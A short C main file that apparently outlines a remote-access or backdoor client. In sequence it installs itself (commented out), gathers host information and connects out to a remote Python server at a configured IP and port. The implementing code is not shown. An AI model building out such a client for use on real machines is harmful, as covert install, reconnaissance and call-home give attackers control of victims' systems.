#include <stdio.h>
#include <stdlib.h>
#include "Information.h"
#include "Install.h"
#include "Connection.h"

int main()
{
    Sleep(2000);
    printf("# Starting server\n");
    printf("# Installing server\n");
    //InstallServer();
    printf("# Starting information gathering\n");
    GatherInformation();
    printf("# All ready, start connection\n");
    init_WSA();
    connectToPyServ(CONNECTION_IP, CONNECTION_PORT);
    return 0;
}
